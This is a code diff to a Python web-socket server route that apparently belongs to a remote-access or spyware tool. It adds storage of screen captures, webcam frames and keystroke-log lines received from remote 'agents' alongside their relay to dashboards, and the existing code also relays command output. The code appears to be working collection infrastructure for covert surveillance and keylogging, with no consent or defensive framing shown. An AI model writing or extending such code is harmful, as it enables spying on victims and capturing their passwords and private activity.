@@ -5,8 +5,83 @@ from auth import verify_token
 import httpx
 import os
 import json
+import base64
+import uuid
+import datetime as dt
+from db import get_session
+from models import EventFile
 
 router = APIRouter()
+
+MEDIA_ROOT = os.getenv("MEDIA_ROOT", os.path.join(os.path.dirname(__file__), 'media'))
+
+async def _store_media_event(kind: str, agent_id: str, frame: dict):
+    # frame: {data: data_url, w: int, h: int}
+    durl = frame.get('data') or ''
+    if not (isinstance(durl, str) and durl.startswith('data:')):
+        return
+    try:
+        header, b64 = durl.split(';base64,', 1)
+    except ValueError:
+        return
+    mime = header[5:] if header.startswith('data:') else 'image/jpeg'
+    ext = 'jpg'
+    if 'png' in mime:
+        ext = 'png'
+    now = dt.datetime.utcnow()
+    sub = now.strftime('%Y%m')
+    out_dir = os.path.join(MEDIA_ROOT, kind, sub)
+    os.makedirs(out_dir, exist_ok=True)
+    fname = f"{uuid.uuid4().hex}.{ext}"
+    raw = base64.b64decode(b64, validate=False)
+    path = os.path.join(out_dir, fname)
+    with open(path, 'wb') as f:
+        f.write(raw)
+    rel = os.path.relpath(path, MEDIA_ROOT).replace('\\', '/')
+    storage_url = f"/media/{rel}"
+    async with await get_session() as s:
+        rec = EventFile(
+            id=uuid.uuid4(),
+            ts=dt.datetime.utcnow(),
+            agent_id=agent_id,
+            kind=kind,
+            storage_url=storage_url,
+            size_bytes=len(raw),
+            width=int(frame.get('w') or 0) or None,
+            height=int(frame.get('h') or 0) or None,
+            note=None,
+        )
+        s.add(rec)
+        await s.commit()
+
+async def _store_keylog_event(agent_id: str, line: str):
+    # Store as a small text file snapshot
+    if not isinstance(line, str) or not line:
+        return
+    now = dt.datetime.utcnow()
+    sub = now.strftime('%Y%m')
+    out_dir = os.path.join(MEDIA_ROOT, 'keylog', sub)
+    os.makedirs(out_dir, exist_ok=True)
+    fname = f"{uuid.uuid4().hex}.txt"
+    path = os.path.join(out_dir, fname)
+    with open(path, 'w', encoding='utf-8') as f:
+        f.write(line)
+    rel = os.path.relpath(path, MEDIA_ROOT).replace('\\', '/')
+    storage_url = f"/media/{rel}"
+    async with await get_session() as s:
+        rec = EventFile(
+            id=uuid.uuid4(),
+            ts=dt.datetime.utcnow(),
+            agent_id=agent_id,
+            kind='keylog',
+            storage_url=storage_url,
+            size_bytes=os.path.getsize(path),
+            width=None,
+            height=None,
+            note=None,
+        )
+        s.add(rec)
+        await s.commit()
 
 @router.websocket('/ws/agent')
 async def ws_agent(ws: WebSocket):
@@ -92,11 +167,24 @@ async def ws_agent(ws: WebSocket):
             if data.get('type') == 'screen_frame':
                 frame = {k: data[k] for k in ('data','w','h','ts') if k in data}
                 await manager.relay_screen_to_dashboards(agent_id, frame)
+                try:
+                    await _store_media_event('screen', agent_id, frame)
+                except Exception:
+                    pass
             elif data.get('type') == 'camera_frame':
                 frame = {k: data[k] for k in ('data','w','h','ts') if k in data}
                 await manager.relay_camera_to_dashboards(agent_id, frame)
+                try:
+                    await _store_media_event('camera', agent_id, frame)
+                except Exception:
+                    pass
             elif data.get('type') == 'keylog_line':
                 await manager.relay_keylog_to_dashboards(agent_id, str(data.get('line','')))
+                # Optional: store keylog snapshot as text file
+                try:
+                    await _store_keylog_event(agent_id, str(data.get('line','')))
+                except Exception:
+                    pass
             elif 'output' in data:
                 await manager.relay_output_to_dashboards(agent_id, str(data['output']))
             elif 'line' in data:
